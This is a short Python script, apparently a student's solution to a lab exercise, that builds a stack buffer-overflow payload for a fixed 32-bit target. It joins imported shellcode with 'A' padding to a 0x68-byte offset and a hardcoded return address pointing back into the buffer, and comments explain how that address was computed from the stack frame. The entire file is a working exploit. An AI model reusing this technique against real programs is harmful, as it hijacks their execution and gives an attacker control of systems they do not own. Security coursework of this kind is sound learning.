#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
#sys.stdout.buffer.write(shellcode)


# buf begin at %ebp - 0x64
# so 0xfffef5ac - 0x64 = 0xfffef548 (start of buff or start address of shellcode)
# ret address = %ebp + 4 // offset to ret is 0x68

offset = 0x68
ret = 0xfffef548

string = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", ret)
sys.stdout.buffer.write(string)
